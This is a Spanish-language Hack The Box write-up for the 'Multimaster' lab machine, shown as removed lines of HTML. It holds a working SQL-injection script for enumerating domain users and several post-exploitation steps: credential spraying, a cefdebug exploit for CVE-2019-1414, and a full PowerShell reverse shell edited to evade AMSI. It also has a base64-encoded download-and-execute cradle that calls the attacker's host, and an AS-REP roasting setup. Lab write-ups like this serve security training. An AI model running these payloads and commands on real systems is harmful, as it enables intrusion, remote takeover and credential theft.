-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;MEGACORP\\Guest&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    }
-]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Esto nos da la idea que podemos lista los usuarios del &lt;code&gt;DC&lt;/code&gt; a partir de poder conmutar el &lt;code&gt;RID&lt;/code&gt;, para ello en vez de hacerlo uno por uno, vamos a modificar un poco el script que ya teniamos para gestionarlo mejor.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/python3
-
-from pwn import *
-import requests, time, json, signal
-
-def def_handler(sig, frame):
-    print(&quot;\n[!] Saliendo...!\n&quot;)
-    sys.exit(1)
-
-#ctrl_c
-signal.signal(signal.SIGINT, def_handler)
-
-#global_variables
-main_url = &quot;http://10.10.10.179/api/getColleagues&quot;
-sid = &quot;0x0105000000000005150000001c00d1bcd181f1492bdfc236&quot;
-
-#tratamos la data
-def recivesql(sqlinyection):
-    sqlmodified = &quot;&quot;
-    for character in sqlinyection:
-        sqlmodified += &quot;\\u00&quot; + hex(ord(character))[2:]
-
-    return sqlmodified
-
-#enviamos la data procesada
-def sendsql(sqlmodified):
-
-    headers = {
-        'Content-Type': 'application/json;charset=utf-8'
-    }
-
-    data_post = '{&quot;name&quot;: &quot;%s&quot;}' % sqlmodified
-    
-    
-    r = requests.post(main_url, headers=headers, data=data_post)
-
-    data_json = json.loads(r.text)
-
-    return (json.dumps(data_json,indent=4))
-
-#obtebemos el RID en el formato adecuado
-def getRID(i):
-    cadena = hex(i).replace(&quot;x&quot;,&quot;&quot;)
-    lista = []
-    for caracter in cadena:
-        lista.append(caracter)
-    rid = lista[2] + lista[3] + lista[0] +lista[1] + &quot;0000&quot;
-
-    return rid
-
-if __name__ == '__main__':
-
-#establecemos un rango que casi siempre corresponden a los usuarios
-    for i in range(1100, 1200):
-        rid = getRID(i)
-        sqli = &quot;ttest' union select 1,(select SUSER_SNAME(%s%s)),3,4,5-- -&quot; % (sid, rid)
-        sqlmodified = recivesql(sqli)
-        response_json = sendsql(sqlmodified)
-
-        print(response_json)
-    
-        time.sleep(2)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Una vez ejecutamos el script despues de un breve momento obtenemos nuevos usuarios.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;❯ python3 sql_inject.py
-[
-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    }
-]
-[
-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;MEGACORP\\DnsAdmins&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    }
-]
-[
-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;MEGACORP\\DnsUpdateProxy&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    }
-]
-[
-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;MEGACORP\\svc-nas&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    }
-]
-[
-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;MEGACORP\\Privileged IT Accounts&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    }
-]
-[
-    
-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;MEGACORP\\tushikikatomo&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    }
-]
-[
-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;MEGACORP\\andrew&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    }
-]
-[
-    {
-        &quot;id&quot;: 1,
-        &quot;name&quot;: &quot;MEGACORP\\lana&quot;,
-        &quot;position&quot;: &quot;3&quot;,
-        &quot;email&quot;: &quot;4&quot;,
-        &quot;src&quot;: &quot;5&quot;
-    }
-]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Con estos nuevos usuarios validamos con &lt;code&gt;crackmapexec&lt;/code&gt; y esta vez obtenemos unas credenciales validas correspondiente al usuario &lt;code&gt;tushikikatomo&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.179 -u users.txt -p passwords --continue-on-success
-SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:password1 STATUS_LOGON_FAILURE 
-SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\tushikikatomo:finance1 
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:banking1 STATUS_LOGON_FAILURE 
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\lana:password1 STATUS_LOGON_FAILURE
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como antes &lt;code&gt;nmap&lt;/code&gt; nos reporto que el puerto &lt;code&gt;5985&lt;/code&gt; estaba abierto intentaremos conectarnos con estas credenciales con &lt;code&gt;evil-winrm&lt;/code&gt;y visualizamos la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.10.179 -u 'tushikikatomo' -p 'finance1'
-
-Evil-WinRM shell v3.4
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-
-*Evil-WinRM* PS C:\Users\alcibiades\Documents&amp;gt; cd ..\Desktop
-*Evil-WinRM* PS C:\Users\alcibiades\Desktop&amp;gt; type user.txt
-9d5ca88b1cafe75450e0b7a7b03c7834
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Enumerando un poco el sistema encontramos que se ejecuta el proceso &lt;code&gt;Code&lt;/code&gt; correspondiente a &lt;code&gt;Visual Code&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;*Evil-WinRM* PS C:\Users\alcibiades\Desktop&amp;gt; Get-Process
-
-Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
--------  ------    -----      -----     ------     --  -- -----------
-    277      51    57564      74188               652   1 Code
-    576      39    30472      72024              1212   1 Code
-    403      53    96468     122704              5464   1 Code
-    315      31    37032      62272              5576   1 Code
-    397      21    16804      23172              5836   1 Code
-    194      15     6112      12432              6056   1 Code
-     63       4      708       3532              5832   0 CompatTelRunner
-     93       8     1308       5884              4092   0 conhost
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vamos a la ruta, lo ejecutamos con el panel de ayuda y y este nos devuelve su version.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;*Evil-WinRM* PS C:\Program Files\Microsoft VS Code\bin&amp;gt; .\code -h
-Visual Studio Code 1.37.1
-
-Usage: code.exe [options][paths...]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Despues de realizar una busqueda encontramos el &lt;code&gt;CVE-2019-1414&lt;/code&gt; asociado a esta version para elevegar privilegios a traves de la exposicion de un debug listener.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Multimaster/multi7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Mayor detalle en el articulo a continuacion:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://iwantmore.pizza/posts/cve-2019-1414.html&quot;&gt;https://iwantmore.pizza/posts/cve-2019-1414.html&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Usaremos la herramienta &lt;code&gt;cefdebug&lt;/code&gt; de github para explotar esta vulnerabilidad&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/taviso/cefdebug&quot;&gt;https://github.com/taviso/cefdebug&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Nos descargamos el ejecutable y lo subimos a la maquina victima en este caso lo hare con un recurso compartido, pero se puede hacer de muchas maneras.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ impacket-smbserver smbFolder $(pwd) -smb2support
-Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
-
-[*] Config file parsed
-[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
-[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
-[*] Config file parsed
-[*] Config file parsed
-[*] Config file parsed
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;*Evil-WinRM* PS C:\WIndows\Temp\Priv&amp;gt; copy \\10.10.16.6\smbFolder\ceffdebug.exe ceffdebug.exe
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Para ejecutarlo solo debemos seguir los pasos tal cual el repositorio.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;*Evil-WinRM* PS C:\WIndows\Temp\Priv&amp;gt; .\ceffdebug.exe
-ceffdebug.exe : [2023/04/02 09:05:12:5013] U: There are 6 tcp sockets in state listen.
-    + CategoryInfo          : NotSpecified: ([2023/04/02 09:...n state listen.:String) [], RemoteException
-    + FullyQualifiedErrorId : NativeCommandError
-[2023/04/02 09:05:32:5800] U: There were 4 servers that appear to be CEF debuggers.
-[2023/04/02 09:05:32:5800] U: ws://127.0.0.1:11996/b1874235-1857-4869-9ded-b35ae9c0f43d
-[2023/04/02 09:05:32:5800] U: ws://127.0.0.1:52031/ef49c60c-66f9-448b-82a9-b08dc1a07022
-[2023/04/02 09:05:32:5800] U: ws://127.0.0.1:24483/2f82f71d-03eb-4e62-ae62-8e8cd1a041c1
-[2023/04/02 09:05:32:5800] U: ws://127.0.0.1:43978/c8928169-15af-4124-83a5-42b180e1b697
-*Evil-WinRM* PS C:\WIndows\Temp\Priv&amp;gt; .\ceffdebug.exe --url ws://127.0.0.1:24483/2f82f71d-03eb-4e62-ae62-8e8cd1a041c1 --code &quot;process.mainModule.require('child_process').exec('ping 10.10.16.6')&quot;
-ceffdebug.exe : [2023/04/02 09:05:58:8202] U: &amp;gt;&amp;gt;&amp;gt; process.mainModule.require('child_process').exec('ping 10.10.16.6')
-    + CategoryInfo          : NotSpecified: ([2023/04/02 09:...ng 10.10.16.6'):String) [], RemoteException
-    + FullyQualifiedErrorId : NativeCommandError
-[2023/04/02 09:05:58:8202] U: &amp;lt;&amp;lt;&amp;lt; ChildProcess
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;y al ponernos en escucha con &lt;code&gt;tcpdump&lt;/code&gt; recibimos la traza &lt;code&gt;icmp&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ tcpdump -i tun0 -n icmp
-tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
-listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
-15:59:01.108853 IP 10.10.10.179 &amp;gt; 10.10.16.6: ICMP echo request, id 1, seq 1, length 40
-15:59:01.108917 IP 10.10.16.6 &amp;gt; 10.10.10.179: ICMP echo reply, id 1, seq 1, length 40
-15:59:02.150656 IP 10.10.10.179 &amp;gt; 10.10.16.6: ICMP echo request, id 1, seq 2, length 40
-15:59:02.150666 IP 10.10.16.6 &amp;gt; 10.10.10.179: ICMP echo reply, id 1, seq 2, length 40
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lo siguiente sera ganar acceso a traves de una consola interactiva, para ello usaremos el script &lt;code&gt;Invoke-PowerShellTcp.ps1&lt;/code&gt; del repositorio de &lt;code&gt;nishang&lt;/code&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/samratashok/nishang&quot;&gt;https://github.com/samratashok/nishang&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Ahora para poder realizar &lt;code&gt;AMSI bypass&lt;/code&gt;, debemos editar el script cambiando el nombre de la funcion y borrando los comentarios para evitar problemas en la ejecucion.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;function dalecontodo 
-{ 
-    [CmdletBinding(DefaultParameterSetName=&quot;reverse&quot;)] Param(
-
-        [Parameter(Position = 0, Mandatory = $true, ParameterSetName=&quot;reverse&quot;)]
-        [Parameter(Position = 0, Mandatory = $false, ParameterSetName=&quot;bind&quot;)]
-        [String]
-        $IPAddress,
-
-        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=&quot;reverse&quot;)]
-        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=&quot;bind&quot;)]
-        [Int]
-        $Port,
-
-        [Parameter(ParameterSetName=&quot;reverse&quot;)]
-        [Switch]
-        $Reverse,
-
-        [Parameter(ParameterSetName=&quot;bind&quot;)]
-        [Switch]
-        $Bind
-
-    )
-
-    
-    try 
-    {
-        if ($Reverse)
-        {
-            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
-        }
-
-        if ($Bind)
-        {
-            $listener = [System.Net.Sockets.TcpListener]$Port
-            $listener.start()    
-            $client = $listener.AcceptTcpClient()
-        } 
-
-        $stream = $client.GetStream()
-        [byte[]]$bytes = 0..65535|%{0}
-
-        $sendbytes = ([text.encoding]::ASCII).GetBytes(&quot;Windows PowerShell running as user &quot; + $env:username + &quot; on &quot; + $env:computername + &quot;`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n&quot;)
-        $stream.Write($sendbytes,0,$sendbytes.Length)
-
-        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '&amp;gt;')
-        $stream.Write($sendbytes,0,$sendbytes.Length)
-
-        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
-        {
-            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
-            $data = $EncodedText.GetString($bytes,0, $i)
-            try
-            {
-                $sendback = (Invoke-Expression -Command $data 2&amp;gt;&amp;amp;1 | Out-String )
-            }
-            catch
-            {
-                Write-Warning &quot;Something went wrong with execution of command on the target.&quot; 
-                Write-Error $_
-            }
-            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '&amp;gt; '
-            $x = ($error[0] | Out-String)
-            $error.clear()
-            $sendback2 = $sendback2 + $x
-
-            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-            $stream.Write($sendbyte,0,$sendbyte.Length)
-            $stream.Flush()  
-        }
-        $client.Close()
-        if ($listener)
-        {
-            $listener.Stop()
-        }
-    }
-    catch
-    {
-        Write-Warning &quot;Something went wrong! Check if the server is reachable and you are using the correct port.&quot; 
-        Write-Error $_
-    }
-}
-dalecontodo -Reverse -IPAddress 10.10.16.3 -Port 443
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;En la maquina victima ejecutaremos una peticion al script con &lt;code&gt;Iex&lt;/code&gt; para que nos lo interprete, pero antes debemos hacerlo en un formato que windows entienda. Para ello usaremos &lt;code&gt;iconv&lt;/code&gt; y lo transformaremos  a &lt;code&gt;base64&lt;/code&gt; de este modo poder ejecutar la peticion con &lt;code&gt;powershell&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo -n &quot;IEX(New-Object Net.WebClient).downloadString('http://10.10.16.3/PS.ps1')&quot; | iconv -t utf-16le | base64 -w 0; echo
-SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADMALwBQAFMALgBwAHMAMQAnACkA
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Teniendo el formato adecuando podemos pasar a ejecutar el &lt;code&gt;cefdebug&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Compartimos el &lt;code&gt;PS.ps1&lt;/code&gt; y seguidamente con &lt;code&gt;rlwrap&lt;/code&gt; y &lt;code&gt;ntcat&lt;/code&gt; ponernos en escucha.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.10.10.179 - - [02/Apr/2023 16:23:11] &quot;GET /PS.ps1 HTTP/1.1&quot; 200 -
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;*Evil-WinRM* PS C:\WIndows\Temp\Priv&amp;gt; .\ceffdebug.exe
-ceffdebug.exe : [2023/04/02 09:28:38:6062] U: There are 3 tcp sockets in state listen.
-    + CategoryInfo          : NotSpecified: ([2023/04/02 09:...n state listen.:String) [], RemoteException
-    + FullyQualifiedErrorId : NativeCommandError
-[2023/04/02 09:28:58:6598] U: There were 1 servers that appear to be CEF debuggers.
-[2023/04/02 09:28:58:6618] U: ws://127.0.0.1:16034/d18406c9-66d7-41ff-946f-3f2a9b0eabfe
-
-*Evil-WinRM* PS C:\WIndows\Temp\Priv&amp;gt; .\ceffdebug.exe --url ws://127.0.0.1:16034/d18406c9-66d7-41ff-946f-3f2a9b0eabfe --code &quot;process.mainModule.require('child_process').exec('powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADYALwBQAFMALgBwAHMAMQAnACkA')&quot;
-ceffdebug.exe : [2023/04/02 09:30:09:1259] U: &amp;gt;&amp;gt;&amp;gt; process.mainModule.require('child_process').exec('powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADYALwBQAFMALgBwA...
-    + CategoryInfo          : NotSpecified: ([2023/04/02 09:...wBQAFMALgBwA...:String) [], RemoteException
-    + FullyQualifiedErrorId : NativeCommandError
-[2023/04/02 09:30:09:1269] U: &amp;lt;&amp;lt;&amp;lt; ChildProcess
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;y recimos una consola como el usuario &lt;code&gt;cyork&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rlwrap ncat -nlvp 443
-Ncat: Version 7.92 ( https://nmap.org/ncat )
-Ncat: Listening on :::443
-Ncat: Listening on 0.0.0.0:443
-Ncat: Connection from 10.10.10.179.
-Ncat: Connection from 10.10.10.179:50183.
-Windows PowerShell running as user cyork on MULTIMASTER
-Copyright (C) 2015 Microsoft Corporation. All rights reserved.
-
-whoami
-megacorp\cyork
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Listando los grupos del usuario, vemos que pertenece al grupo &lt;code&gt;Developers&lt;/code&gt;; este grupo tiene acceso al directorio &lt;code&gt;inetpub\wwwroot&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Dentro encontramos archivos &lt;code&gt;dll&lt;/code&gt;, concretamente un archivo de nombre &lt;code&gt;MultimasterAPI.dll&lt;/code&gt; que procederemos a traernos a nuestra maquina.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;dir
-    Directory: C:\inetpub\wwwroot\bin
-
-
-Mode                LastWriteTime         Length Name                                                                  
-----                -------------         ------ ----                                                                  
-d-----         1/7/2020   9:28 PM                roslyn                                                                
--a----        2/21/2013   7:13 PM         102912 Antlr3.Runtime.dll                                                    
--a----        2/21/2013   7:13 PM         431616 Antlr3.Runtime.pdb                                                    
--a----        5/24/2018   1:08 AM          40080 Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll                
--a----        7/24/2012  11:18 PM          45416 Microsoft.Web.Infrastructure.dll                                      
--a----         1/9/2020   4:13 AM          13824 MultimasterAPI.dll                                                    
--a----         1/9/2020   4:13 AM          28160 MultimasterAPI.pdb                                                    
--a----        2/17/2018   8:14 PM         664576 Newtonsoft.Json.dll                                                   
--a----       11/27/2018  11:30 PM         178808 System.Net.Http.Formatting.dll                                        
--a----       11/27/2018  11:28 PM          27768 System.Web.Cors.dll                                                   
--a----        1/27/2015   2:34 PM         139976 System.Web.Helpers.dll                                                
--a----       11/27/2018  11:31 PM          39352 System.Web.Http.Cors.dll                                              
--a----       11/27/2018  11:31 PM         455096 System.Web.Http.dll                                                   
--a----        1/31/2018  10:49 PM          77520 System.Web.Http.WebHost.dll                                           
--a----        1/27/2015   2:32 PM         566472 System.Web.Mvc.dll                                                    
--a----        2/11/2014   1:56 AM          70864 System.Web.Optimization.dll                                           
--a----        1/27/2015   2:32 PM         272072 System.Web.Razor.dll                                                  
--a----        1/27/2015   2:34 PM          41672 System.Web.WebPages.Deployment.dll                                    
--a----        1/27/2015   2:34 PM         211656 System.Web.WebPages.dll                                               
--a----        1/27/2015   2:34 PM          39624 System.Web.WebPages.Razor.dll                                         
--a----        7/17/2013   4:33 AM        1276568 WebGrease.dll                                                         
-PS C:\inetpub\wwwroot\bin&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vemos la lista de caracteres imprimibles con &lt;code&gt;strings&lt;/code&gt;, pero al ser un ejecutable de windows usaremos el parametro &lt;code&gt;-e l&lt;/code&gt; para que nos liste mayor informacion.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ strings -e l MultimasterAPI.dll
-FROM
-WHERE
-LIKE
-INFORMATION_SCHEMA
-MASTER
-{ &quot;info&quot; : &quot;MegaCorp API&quot; }
-application/json
-server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Obtenemos una nueva contraseña y volveremos a validarla con &lt;code&gt;crackmapexec&lt;/code&gt; si corrsponde a otro usuario.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ crackmapexec smb 10.10.10.179 -u users.txt -p 'D3veL0pM3nT!' --continue-on-success
-SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\tushikikatomo:D3veL0pM3nT! STATUS_LOGON_FAILURE 
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\lana:D3veL0pM3nT! STATUS_LOGON_FAILURE 
-SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\andrew:D3veL0pM3nT! STATUS_LOGON_FAILURE 
-SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP.LOCAL\sbauer:D3veL0pM3nT!
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Con estas nuevas credenciales nos volvemos a conectar con &lt;code&gt;evil-winrm&lt;/code&gt; y tendriamos acceso esta vez como &lt;code&gt;sbauer&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.10.179 -u 'sbauer' -p 'D3veL0pM3nT!'
-
-Evil-WinRM shell v3.4
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-
-*Evil-WinRM* PS C:\Users\sbauer\Documents&amp;gt; whoami
-megacorp\sbauer
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Seguidamente subiremos el ejecutable &lt;code&gt;sharphound.exe&lt;/code&gt; para recopilar datos de &lt;code&gt;DC&lt;/code&gt; que posteriormente con &lt;code&gt;bloodhound&lt;/code&gt; interpretaremos.&lt;/p&gt;
-
-&lt;p&gt;Una vez tengamos el archivo en la maquina victima lo ejecutamos y este nos generara un archivo &lt;code&gt;.zip&lt;/code&gt; que abriremos en &lt;code&gt;bloodhound&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;*Evil-WinRM* PS C:\WIndows\Temp\Privesc&amp;gt; .\SharpHound.exe -c All
-2023-04-02T09:45:51.8354209-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
-2023-04-02T09:45:51.9916814-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
-
-*Evil-WinRM* PS C:\WIndows\Temp\Privesc&amp;gt; dir
-
-
-    Directory: C:\WIndows\Temp\Privesc
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--a----         4/2/2023   9:47 AM          14062 20230402094551_BloodHound.zip
--a----         8/3/2022   9:21 AM        1060864 SharpHound.exe
--a----         4/2/2023   9:47 AM          13225 YThiODEyNWUtMTcwMC00YWY2LTgwZmYtNmIxMWU0MTM4ZDg5.bin
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Subimos el &lt;code&gt;.zip&lt;/code&gt; a bloodhound&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Multimaster/multi8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;marcamos al usuario &lt;code&gt;sbauer&lt;/code&gt; como &lt;code&gt;User as owned&lt;/code&gt; y en analisys pinchamos en la opcion &lt;code&gt;Shortest Paths form Owned Principals&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Multimaster/multi11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Observamos que el usuario &lt;code&gt;sbauer&lt;/code&gt; tiene el privilegio &lt;code&gt;Generic Write&lt;/code&gt; sobre el usuario &lt;code&gt;Jorden&lt;/code&gt; quien a su vez forma parte del grupo &lt;code&gt;Server Operators&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Multimaster/multi12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;GenericWrite - actualizar los atributos del objeto (por ejemplo, script de inicio de sesión)&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Aprovecharemos el &lt;code&gt;Generic Write&lt;/code&gt; para setear la propiedad &lt;code&gt;dont require Kerberos preauthentication&lt;/code&gt; y con esto hacer al usuario &lt;code&gt;ASREPRoasteable&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;*Evil-WinRM* PS C:\Windows\Temp\Privesc&amp;gt; Get-Aduser jorden | Set-ADAccountControl  -doesnotrequirepreauth $true
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Con&lt;code&gt;GetNPUsers.py&lt;/code&gt; esta vez si podamos obtener el hash&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ GetNPUsers.py MEGACORP.LOCAL/ -no-pass -usersfile users.txt
-Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
-
-[-] User tushikikatomo doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User lana doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User andrew doesn't have UF_DONT_REQUIRE_PREAUTH set
